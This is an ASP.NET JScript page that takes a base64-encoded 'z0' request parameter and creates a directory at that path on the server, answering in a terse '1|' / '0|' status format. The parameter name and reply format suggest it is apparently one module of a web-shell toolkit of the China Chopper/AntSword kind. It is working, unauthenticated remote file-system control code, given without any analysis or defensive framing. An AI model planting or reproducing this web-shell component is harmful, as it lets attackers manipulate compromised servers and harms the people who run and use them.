<%

function GetCurrentCharset() : String {
    var charset : String = System.Web.HttpContext.Current.Response.Charset;
    
    if (charset == null || charset == "") {
        switch (System.Web.HttpContext.Current.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252:  charset = "windows-1252"; break;
            case 936:   charset = "gb2312"; break;
            case 950:   charset = "big5"; break;
            case 1251:  charset = "windows-1251"; break;
            default:    charset = "utf-8"; break;
        }
    }
    return charset;
}

function Base64Decode(str : String) : String {
    try {
        var encBytes : Byte[] = System.Convert.FromBase64String(str);
        var encoding : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());
        return encoding.GetString(encBytes);
    } catch(e) {
        return "";
    }
}

var z0 : String = Request.Item["z0"];
if (z0 == null || z0.Trim() == "") {
    Response.Write("0|Failed to create folder. (Missing parameter)");
} else {
    var dir_name : String = Base64Decode(z0);
    if (dir_name == "") {
        Response.Write("0|Failed to create folder. (Invalid base64 string)");
    } else {
        try {
            if (System.IO.Directory.Exists(dir_name)) {
                Response.Write("0|Folder already exists");
            }

            System.IO.Directory.CreateDirectory(dir_name);
            Response.Write("1|");
        } 
        catch(e) {
            Response.Write("0|Failed to create folder. Error: " + e.message);
        }
    }
}


%>